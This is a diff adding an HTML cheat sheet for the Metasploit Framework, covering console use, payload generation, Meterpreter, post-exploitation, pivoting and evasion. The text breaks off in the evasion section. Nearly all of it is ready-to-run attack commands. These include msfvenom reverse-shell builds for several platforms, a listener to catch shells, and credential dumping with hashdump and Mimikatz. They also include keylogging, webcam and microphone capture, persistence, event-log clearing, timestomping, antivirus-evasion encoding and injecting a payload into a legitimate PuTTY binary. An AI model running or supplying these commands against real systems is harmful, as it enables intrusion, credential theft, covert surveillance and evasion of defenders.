@@ -1,0 +1,445 @@
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:var(--font-mono,'Courier New',monospace)}
+.wrap{padding:1rem 0;max-width:100%}
+.header{background:#0d1117;border-radius:var(--border-radius-lg);padding:1.5rem;margin-bottom:1rem;border:0.5px solid #30363d}
+.header h1{font-family:var(--font-mono);font-size:22px;font-weight:500;color:#58a6ff;letter-spacing:1px}
+.header p{font-size:13px;color:#8b949e;margin-top:6px;font-family:var(--font-sans)}
+.badge{display:inline-block;padding:2px 10px;border-radius:20px;font-size:11px;font-family:var(--font-sans);margin-left:8px;vertical-align:middle}
+.b-red{background:#3d1c1c;color:#f85149}
+.b-green{background:#122d22;color:#3fb950}
+.b-blue{background:#0c2d5e;color:#58a6ff}
+.b-yellow{background:#2d1f00;color:#d29922}
+.tabs{display:flex;gap:4px;margin-bottom:1rem;flex-wrap:wrap}
+.tab{padding:6px 14px;border-radius:20px;font-size:12px;cursor:pointer;border:0.5px solid #30363d;background:#0d1117;color:#8b949e;font-family:var(--font-sans);transition:all 0.15s}
+.tab.active{background:#1f3a5f;color:#58a6ff;border-color:#58a6ff}
+.tab:hover:not(.active){background:#161b22;color:#c9d1d9}
+.section{display:none}
+.section.active{display:block}
+.card{background:#0d1117;border:0.5px solid #30363d;border-radius:var(--border-radius-md);margin-bottom:10px;overflow:hidden}
+.card-title{background:#161b22;padding:8px 14px;font-size:12px;font-weight:500;color:#79c0ff;font-family:var(--font-sans);display:flex;align-items:center;gap:8px;border-bottom:0.5px solid #30363d}
+.card-title i{font-size:14px;color:#388bfd}
+.cmd-row{display:grid;grid-template-columns:1fr 1fr;border-bottom:0.5px solid #21262d}
+.cmd-row:last-child{border-bottom:none}
+.cmd-row.single{grid-template-columns:1fr}
+.cmd{padding:7px 14px;font-size:12px;color:#e6edf3;font-family:var(--font-mono)}
+.cmd code{color:#ffa657;font-size:11.5px}
+.cmd .arg{color:#79c0ff}
+.desc{padding:7px 14px;font-size:12px;color:#8b949e;font-family:var(--font-sans);border-left:0.5px solid #21262d;display:flex;align-items:center}
+.highlight{background:#1f2d1f}
+.highlight .cmd code{color:#3fb950}
+.danger{background:#2d1c1c}
+.danger .cmd code{color:#f85149}
+.tip{background:#1a1a2e;border-left:3px solid #58a6ff;border-radius:var(--border-radius-md);padding:10px 14px;margin-bottom:10px;font-size:12px;color:#8b949e;font-family:var(--font-sans)}
+.tip strong{color:#58a6ff}
+.two-col{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.flow{display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin-bottom:12px}
+.flow-step{background:#161b22;border:0.5px solid #30363d;border-radius:var(--border-radius-md);padding:8px 12px;font-size:11px;color:#c9d1d9;font-family:var(--font-sans);text-align:center;flex:1;min-width:90px}
+.flow-step .num{display:block;font-size:18px;font-weight:500;color:#58a6ff;margin-bottom:2px}
+.arrow{color:#30363d;font-size:16px;flex-shrink:0}
+.tag{display:inline-block;background:#1f3a5f;color:#58a6ff;font-size:10px;padding:1px 6px;border-radius:10px;margin-left:6px;font-family:var(--font-sans)}
+.tag.g{background:#122d22;color:#3fb950}
+.tag.r{background:#3d1c1c;color:#f85149}
+.tag.y{background:#2d1f00;color:#d29922}
+</style>
+<div class="wrap">
+
+<div class="header">
+  <h1><i class="ti ti-terminal" aria-hidden="true"></i> Metasploit Framework <span class="badge b-red">msf6</span><span class="badge b-green">MASTER CHEATSHEET</span></h1>
+  <p>Complete command reference — exploitation, post-exploitation, pivoting, evasion & more</p>
+</div>
+
+<div class="tabs">
+  <button class="tab active" onclick="show('core')">🔧 Core</button>
+  <button class="tab" onclick="show('search')">🔍 Search & Load</button>
+  <button class="tab" onclick="show('payloads')">💣 Payloads</button>
+  <button class="tab" onclick="show('meterpreter')">🐚 Meterpreter</button>
+  <button class="tab" onclick="show('post')">⚙️ Post-Exploit</button>
+  <button class="tab" onclick="show('pivot')">🔀 Pivoting</button>
+  <button class="tab" onclick="show('db')">🗄️ Database</button>
+  <button class="tab" onclick="show('evasion')">🛡️ Evasion</button>
+  <button class="tab" onclick="show('tips')">💡 Pro Tips</button>
+</div>
+
+<div id="core" class="section active">
+  <div class="tip"><strong>msfconsole</strong> is the primary interface. Always launch as root on Linux. Use <code style="color:#ffa657">msfdb init</code> first to initialize the database.</div>
+  <div class="flow">
+    <div class="flow-step"><span class="num">1</span>Start MSF</div><div class="arrow">→</div>
+    <div class="flow-step"><span class="num">2</span>Search/Use</div><div class="arrow">→</div>
+    <div class="flow-step"><span class="num">3</span>Set Options</div><div class="arrow">→</div>
+    <div class="flow-step"><span class="num">4</span>Exploit</div><div class="arrow">→</div>
+    <div class="flow-step"><span class="num">5</span>Post-Exploit</div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-terminal" aria-hidden="true"></i> Launch & Setup</div>
+    <div class="cmd-row"><div class="cmd"><code>msfconsole</code></div><div class="desc">Start Metasploit console</div></div>
+    <div class="cmd-row"><div class="cmd"><code>msfconsole -q</code></div><div class="desc">Start quietly (no banner)</div></div>
+    <div class="cmd-row"><div class="cmd"><code>msfconsole -r <span class="arg">&lt;script.rc&gt;</span></code></div><div class="desc">Run resource script on startup</div></div>
+    <div class="cmd-row"><div class="cmd"><code>msfdb init</code></div><div class="desc">Initialize PostgreSQL database</div></div>
+    <div class="cmd-row"><div class="cmd"><code>msfdb reinit</code></div><div class="desc">Wipe & re-initialize DB</div></div>
+    <div class="cmd-row"><div class="cmd"><code>msfupdate</code></div><div class="desc">Update framework (Kali: apt)</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-settings" aria-hidden="true"></i> Global Options & Controls</div>
+    <div class="cmd-row"><div class="cmd"><code>help</code> / <code>?</code></div><div class="desc">Show help menu</div></div>
+    <div class="cmd-row"><div class="cmd"><code>version</code></div><div class="desc">Show MSF version</div></div>
+    <div class="cmd-row"><div class="cmd"><code>setg RHOSTS <span class="arg">&lt;ip&gt;</span></code></div><div class="desc">Set global option (all modules)</div></div>
+    <div class="cmd-row"><div class="cmd"><code>unsetg RHOSTS</code></div><div class="desc">Unset global option</div></div>
+    <div class="cmd-row"><div class="cmd"><code>save</code></div><div class="desc">Save current settings to disk</div></div>
+    <div class="cmd-row"><div class="cmd"><code>spool <span class="arg">/tmp/log.txt</span></code></div><div class="desc">Log all output to file</div></div>
+    <div class="cmd-row"><div class="cmd"><code>makerc <span class="arg">/tmp/session.rc</span></code></div><div class="desc">Save commands to resource file</div></div>
+    <div class="cmd-row"><div class="cmd"><code>resource <span class="arg">&lt;file.rc&gt;</span></code></div><div class="desc">Execute resource file</div></div>
+    <div class="cmd-row"><div class="cmd"><code>jobs</code></div><div class="desc">List background jobs</div></div>
+    <div class="cmd-row"><div class="cmd"><code>kill <span class="arg">&lt;job_id&gt;</span></code></div><div class="desc">Kill a background job</div></div>
+    <div class="cmd-row"><div class="cmd"><code>sessions</code></div><div class="desc">List active sessions</div></div>
+    <div class="cmd-row"><div class="cmd"><code>sessions -i <span class="arg">&lt;id&gt;</span></code></div><div class="desc">Interact with session</div></div>
+    <div class="cmd-row"><div class="cmd"><code>sessions -k <span class="arg">&lt;id&gt;</span></code></div><div class="desc">Kill session</div></div>
+    <div class="cmd-row"><div class="cmd"><code>sessions -K</code></div><div class="desc">Kill ALL sessions</div></div>
+  </div>
+</div>
+
+<div id="search" class="section">
+  <div class="card">
+    <div class="card-title"><i class="ti ti-search" aria-hidden="true"></i> Search Syntax</div>
+    <div class="cmd-row single"><div class="cmd"><code>search <span class="arg">eternalblue</span></code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>search type:exploit platform:windows name:smb</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>search cve:<span class="arg">2021-44228</span></code> <span class="tag">CVE search</span></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>search rank:excellent type:exploit</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>search author:<span class="arg">hdm</span></code></div></div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-box" aria-hidden="true"></i> Module Types</div>
+    <div class="cmd-row"><div class="cmd"><code class="tag b-red">exploit/</code></div><div class="desc">Delivers payload into target</div></div>
+    <div class="cmd-row"><div class="cmd"><code class="tag b-green">auxiliary/</code></div><div class="desc">Scanners, fuzzers, DoS tools</div></div>
+    <div class="cmd-row"><div class="cmd"><code class="tag b-blue">post/</code></div><div class="desc">Post-exploitation modules</div></div>
+    <div class="cmd-row"><div class="cmd"><code class="tag b-yellow">payload/</code></div><div class="desc">Shellcode to execute on target</div></div>
+    <div class="cmd-row"><div class="cmd"><code style="color:#e6edf3">encoder/</code></div><div class="desc">Encode payloads for evasion</div></div>
+    <div class="cmd-row"><div class="cmd"><code style="color:#e6edf3">nop/</code></div><div class="desc">NOP sleds for stability</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-code" aria-hidden="true"></i> Using Modules</div>
+    <div class="cmd-row"><div class="cmd"><code>use <span class="arg">exploit/multi/handler</span></code></div><div class="desc">Load a module by path</div></div>
+    <div class="cmd-row"><div class="cmd"><code>use <span class="arg">0</span></code></div><div class="desc">Use by search result index number</div></div>
+    <div class="cmd-row"><div class="cmd"><code>info</code></div><div class="desc">Show full module info</div></div>
+    <div class="cmd-row"><div class="cmd"><code>show options</code></div><div class="desc">Show required/optional options</div></div>
+    <div class="cmd-row"><div class="cmd"><code>show advanced</code></div><div class="desc">Show advanced options</div></div>
+    <div class="cmd-row"><div class="cmd"><code>show payloads</code></div><div class="desc">List compatible payloads</div></div>
+    <div class="cmd-row"><div class="cmd"><code>show targets</code></div><div class="desc">List exploitable targets/OSes</div></div>
+    <div class="cmd-row"><div class="cmd"><code>show missing</code></div><div class="desc">Show unset required options</div></div>
+    <div class="cmd-row"><div class="cmd"><code>check</code></div><div class="desc">Check if target is vulnerable</div></div>
+    <div class="cmd-row"><div class="cmd"><code>run</code> / <code>exploit</code></div><div class="desc">Execute the module</div></div>
+    <div class="cmd-row"><div class="cmd"><code>run -j</code></div><div class="desc">Run as background job</div></div>
+    <div class="cmd-row"><div class="cmd"><code>run -z</code></div><div class="desc">Run and background session</div></div>
+    <div class="cmd-row"><div class="cmd"><code>back</code></div><div class="desc">Exit current module context</div></div>
+    <div class="cmd-row"><div class="cmd"><code>previous</code></div><div class="desc">Return to previous module</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-scan" aria-hidden="true"></i> Key Auxiliary Modules</div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>use auxiliary/scanner/portscan/tcp</code> — TCP port scanner</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>use auxiliary/scanner/smb/smb_version</code> — SMB version detection</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>use auxiliary/scanner/smb/smb_ms17_010</code> — EternalBlue check</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>use auxiliary/scanner/ssh/ssh_login</code> — SSH brute force</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>use auxiliary/scanner/http/http_version</code> — Web server fingerprint</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>use auxiliary/scanner/ftp/ftp_login</code> — FTP brute force</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>use auxiliary/scanner/rdp/rdp_scanner</code> — RDP detection</div></div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>use auxiliary/scanner/snmp/snmp_enum</code> — SNMP enumeration</div></div>
+  </div>
+</div>
+
+<div id="payloads" class="section">
+  <div class="tip"><strong>Staged</strong> payloads (windows/meterpreter/<strong>reverse_tcp</strong>) need a listener first — small stager calls home. <strong>Stageless</strong> (windows/meterpreter_reverse_tcp) are self-contained — bigger but work through strict firewalls.</div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-package" aria-hidden="true"></i> msfvenom — Payload Generation</div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="arg">&lt;IP&gt;</span> LPORT=<span class="arg">4444</span> -f exe -o shell.exe</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="arg">&lt;IP&gt;</span> LPORT=<span class="arg">4444</span> -f elf -o shell.elf</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=<span class="arg">&lt;IP&gt;</span> LPORT=<span class="arg">4444</span> -f raw -o shell.php</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="arg">&lt;IP&gt;</span> LPORT=<span class="arg">4444</span> -f raw -o shell.jsp</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="arg">&lt;IP&gt;</span> LPORT=<span class="arg">4444</span> -f asp -o shell.asp</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<span class="arg">&lt;IP&gt;</span> LPORT=<span class="arg">4444</span> -f macho -o shell</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=<span class="arg">&lt;IP&gt;</span> LPORT=<span class="arg">4444</span> R -o shell.apk</code></div></div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>msfvenom -p windows/meterpreter/reverse_https LHOST=<span class="arg">&lt;IP&gt;</span> LPORT=<span class="arg">443</span> -f exe -o https_shell.exe</code> <span class="tag g">HTTPS</span></div></div>
+  </div>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title"><i class="ti ti-shield" aria-hidden="true"></i> Encoding (Evasion)</div>
+      <div class="cmd-row single"><div class="cmd"><code>msfvenom ... -e x86/shikata_ga_nai -i <span class="arg">5</span></code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>msfvenom -l encoders</code> — list all</div></div>
+      <div class="cmd-row single"><div class="cmd"><code>msfvenom ... --smallest</code></div></div>
+    </div>
+    <div class="card">
+      <div class="card-title"><i class="ti ti-list" aria-hidden="true"></i> List & Formats</div>
+      <div class="cmd-row single"><div class="cmd"><code>msfvenom -l payloads</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>msfvenom -l formats</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>msfvenom --payload-options</code></div></div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-antenna" aria-hidden="true"></i> Multi/Handler Listener (catch shells)</div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>use exploit/multi/handler</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>set PAYLOAD <span class="arg">windows/meterpreter/reverse_tcp</span></code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>set LHOST <span class="arg">0.0.0.0</span></code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>set LPORT <span class="arg">4444</span></code></div></div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>set ExitOnSession false</code> <span class="tag g">keep listening</span></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run -j</code> — run as background job</div></div>
+  </div>
+</div>
+
+<div id="meterpreter" class="section">
+  <div class="tip"><strong>Meterpreter</strong> runs entirely in memory — no files written to disk. Communicates over encrypted channel. Use <code style="color:#ffa657">help</code> inside meterpreter for full command list.</div>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title"><i class="ti ti-info-circle" aria-hidden="true"></i> System Info</div>
+      <div class="cmd-row single"><div class="cmd"><code>sysinfo</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>getuid</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>getpid</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>ps</code> — list processes</div></div>
+      <div class="cmd-row single"><div class="cmd"><code>pgrep <span class="arg">lsass</span></code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>idletime</code></div></div>
+    </div>
+    <div class="card">
+      <div class="card-title"><i class="ti ti-folder" aria-hidden="true"></i> File System</div>
+      <div class="cmd-row single"><div class="cmd"><code>pwd</code> / <code>ls</code> / <code>cd</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>upload <span class="arg">&lt;file&gt;</span></code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>download <span class="arg">&lt;file&gt;</span></code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>search -f <span class="arg">*.txt</span></code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>edit <span class="arg">&lt;file&gt;</span></code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>cat <span class="arg">&lt;file&gt;</span></code></div></div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-lock" aria-hidden="true"></i> Privilege Escalation</div>
+    <div class="cmd-row"><div class="cmd"><code>getsystem</code></div><div class="desc">Auto-escalate to SYSTEM</div></div>
+    <div class="cmd-row"><div class="cmd"><code>getprivs</code></div><div class="desc">Show current privileges</div></div>
+    <div class="cmd-row highlight"><div class="cmd"><code>use post/multi/recon/local_exploit_suggester</code></div><div class="desc">Find local privesc vectors</div></div>
+    <div class="cmd-row"><div class="cmd"><code>migrate <span class="arg">&lt;PID&gt;</span></code></div><div class="desc">Migrate to another process</div></div>
+    <div class="cmd-row"><div class="cmd"><code>steal_token <span class="arg">&lt;PID&gt;</span></code></div><div class="desc">Steal access token</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-key" aria-hidden="true"></i> Credential Dumping</div>
+    <div class="cmd-row single danger"><div class="cmd"><code>hashdump</code> — dump SAM hashes (requires SYSTEM)</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/windows/gather/credentials/credential_collector</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/windows/gather/smart_hashdump</code></div></div>
+    <div class="cmd-row single danger"><div class="cmd"><code>load kiwi</code> — load Mimikatz module</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>creds_all</code> — dump all creds via kiwi</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>lsa_dump_sam</code> — dump SAM via kiwi</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>lsa_dump_secrets</code> — dump LSA secrets</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>wifi_list</code> — list WiFi credentials</div></div>
+  </div>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title"><i class="ti ti-camera" aria-hidden="true"></i> Surveillance</div>
+      <div class="cmd-row single"><div class="cmd"><code>screenshot</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>keyscan_start</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>keyscan_dump</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>keyscan_stop</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>webcam_snap</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>record_mic</code></div></div>
+    </div>
+    <div class="card">
+      <div class="card-title"><i class="ti ti-shell" aria-hidden="true"></i> Shell & Session</div>
+      <div class="cmd-row single"><div class="cmd"><code>shell</code> — drop to OS shell</div></div>
+      <div class="cmd-row single"><div class="cmd"><code>execute -f <span class="arg">cmd.exe</span></code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>background</code> / <code>bg</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>exit</code> / <code>quit</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>irb</code> — Ruby shell</div></div>
+    </div>
+  </div>
+</div>
+
+<div id="post" class="section">
+  <div class="card">
+    <div class="card-title"><i class="ti ti-world" aria-hidden="true"></i> Network & Host Recon</div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>run post/multi/recon/local_exploit_suggester</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/windows/gather/enum_network</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/windows/gather/enum_shares</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/windows/gather/enum_logged_on_users</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/windows/gather/enum_domain</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/multi/gather/env</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/windows/gather/checkvm</code> — detect VM environment</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/windows/gather/arp_scanner RHOSTS=<span class="arg">10.0.0.0/24</span></code></div></div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-database" aria-hidden="true"></i> Data Gathering</div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/windows/gather/forensics/browser_history</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/multi/gather/firefox_creds</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/windows/gather/credentials/chrome</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/windows/gather/credentials/outlook</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/windows/gather/credentials/vnc</code></div></div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>run post/multi/manage/shell_to_meterpreter</code> — upgrade shell</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-repeat" aria-hidden="true"></i> Persistence</div>
+    <div class="cmd-row single danger"><div class="cmd"><code>run post/windows/manage/persistence STARTUP=SCHEDULER</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/linux/manage/cron_persistence</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/windows/manage/persistence_exe</code></div></div>
+    <div class="cmd-row single danger"><div class="cmd"><code>run post/windows/manage/sshkey_persistence</code></div></div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-eraser" aria-hidden="true"></i> Cleanup & Covering Tracks</div>
+    <div class="cmd-row single"><div class="cmd"><code>clearev</code> — clear Windows event logs</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>run post/windows/manage/delete_user</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>timestomp <span class="arg">&lt;file&gt;</span> -m <span class="arg">"01/01/2020 12:00:00"</span></code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>rm <span class="arg">&lt;file&gt;</span></code> / <code>rmdir <span class="arg">&lt;dir&gt;</span></code></div></div>
+  </div>
+</div>
+
+<div id="pivot" class="section">
+  <div class="tip"><strong>Pivoting</strong> lets you attack internal networks via a compromised host. Route traffic through sessions to reach otherwise-unreachable subnets.</div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-route" aria-hidden="true"></i> Route & Autoroute</div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>run post/multi/manage/autoroute</code> — auto-add routes via session</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>route add <span class="arg">10.10.10.0/24</span> <span class="arg">&lt;session_id&gt;</span></code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>route print</code> — show current routes</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>route flush</code> — clear all routes</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>route remove <span class="arg">10.10.10.0/24</span> <span class="arg">&lt;session_id&gt;</span></code></div></div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-arrows-left-right" aria-hidden="true"></i> Port Forwarding</div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>portfwd add -l <span class="arg">8080</span> -p <span class="arg">80</span> -r <span class="arg">&lt;target_ip&gt;</span></code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>portfwd add -l <span class="arg">3389</span> -p <span class="arg">3389</span> -r <span class="arg">&lt;target_ip&gt;</span></code> — RDP pivot</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>portfwd list</code> — show forwards</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>portfwd delete -l <span class="arg">8080</span></code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>portfwd flush</code> — clear all</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-topology-ring" aria-hidden="true"></i> SOCKS Proxy (Proxychains)</div>
+    <div class="cmd-row single"><div class="cmd"><code>use auxiliary/server/socks_proxy</code></div></div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>set SRVPORT <span class="arg">1080</span>; set VERSION <span class="arg">5</span>; run -j</code></div></div>
+    <div class="cmd-row single"><div class="cmd">Edit <code>/etc/proxychains4.conf</code>: <code>socks5 127.0.0.1 1080</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>proxychains nmap -sT -Pn <span class="arg">10.10.10.1</span></code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>proxychains firefox</code> — browse internal network</div></div>
+  </div>
+</div>
+
+<div id="db" class="section">
+  <div class="tip"><strong>Metasploit DB</strong> stores hosts, services, vulnerabilities, and credentials. Essential for large engagements. Always use workspaces to separate client data.</div>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title"><i class="ti ti-database" aria-hidden="true"></i> DB Status</div>
+      <div class="cmd-row single"><div class="cmd"><code>db_status</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>db_connect</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>db_disconnect</code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>db_rebuild_cache</code></div></div>
+    </div>
+    <div class="card">
+      <div class="card-title"><i class="ti ti-folders" aria-hidden="true"></i> Workspaces</div>
+      <div class="cmd-row single"><div class="cmd"><code>workspace</code> — list all</div></div>
+      <div class="cmd-row single"><div class="cmd"><code>workspace -a <span class="arg">&lt;name&gt;</span></code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>workspace -d <span class="arg">&lt;name&gt;</span></code></div></div>
+      <div class="cmd-row single"><div class="cmd"><code>workspace <span class="arg">&lt;name&gt;</span></code></div></div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-table" aria-hidden="true"></i> Hosts, Services & Vulns</div>
+    <div class="cmd-row"><div class="cmd"><code>hosts</code></div><div class="desc">List discovered hosts</div></div>
+    <div class="cmd-row"><div class="cmd"><code>hosts -R</code></div><div class="desc">Set RHOSTS from DB hosts</div></div>
+    <div class="cmd-row"><div class="cmd"><code>hosts -d</code></div><div class="desc">Delete all hosts</div></div>
+    <div class="cmd-row"><div class="cmd"><code>services</code></div><div class="desc">List discovered services</div></div>
+    <div class="cmd-row"><div class="cmd"><code>services -p <span class="arg">80,443</span></code></div><div class="desc">Filter by port</div></div>
+    <div class="cmd-row"><div class="cmd"><code>vulns</code></div><div class="desc">List known vulnerabilities</div></div>
+    <div class="cmd-row"><div class="cmd"><code>creds</code></div><div class="desc">List captured credentials</div></div>
+    <div class="cmd-row"><div class="cmd"><code>loot</code></div><div class="desc">List captured loot files</div></div>
+    <div class="cmd-row highlight"><div class="cmd"><code>db_nmap -sV -O <span class="arg">&lt;target&gt;</span></code></div><div class="desc">Nmap scan → auto import to DB</div></div>
+    <div class="cmd-row"><div class="cmd"><code>db_import <span class="arg">&lt;scan.xml&gt;</span></code></div><div class="desc">Import Nmap/Nessus XML</div></div>
+    <div class="cmd-row"><div class="cmd"><code>db_export -f xml <span class="arg">&lt;out.xml&gt;</span></code></div><div class="desc">Export DB to file</div></div>
+  </div>
+</div>
+
+<div id="evasion" class="section">
+  <div class="tip"><strong>AV evasion</strong> is an arms race. No single technique is foolproof. Combine multiple layers: encoding + custom payload + process injection + HTTPS comms.</div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-eye-off" aria-hidden="true"></i> Payload Encoding</div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>msfvenom ... -e x86/shikata_ga_nai -i <span class="arg">10</span> -b '\x00'</code> — poly encoder</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>msfvenom ... -e x86/alpha_mixed</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>msfvenom ... -e x64/xor_dynamic</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>msfvenom -l encoders</code> — list all encoders</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-binary" aria-hidden="true"></i> Template Injection</div>
+    <div class="cmd-row single"><div class="cmd"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="arg">IP</span> LPORT=<span class="arg">443</span> -x <span class="arg">putty.exe</span> -k -f exe -o evil_putty.exe</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>-x <span class="arg">&lt;template.exe&gt;</span></code> — inject into legit binary</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>-k</code> — keep template behavior intact</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-lock" aria-hidden="true"></i> HTTPS & Encrypted Comms</div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>PAYLOAD=windows/meterpreter/reverse_https</code> — encrypted C2</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>set EnableStageEncoding true</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>set StageEncoder x86/shikata_ga_nai</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>set HandlerSSLCert <span class="arg">/path/to/cert.pem</span></code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>set StagerVerifySSLCert true</code></div></div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-ghost" aria-hidden="true"></i> Process Migration & Injection</div>
+    <div class="cmd-row single"><div class="cmd"><code>migrate <span class="arg">&lt;PID&gt;</span></code> — move to stable/trusted process</div></div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>migrate -N <span class="arg">explorer.exe</span></code> — migrate by process name</div></div>
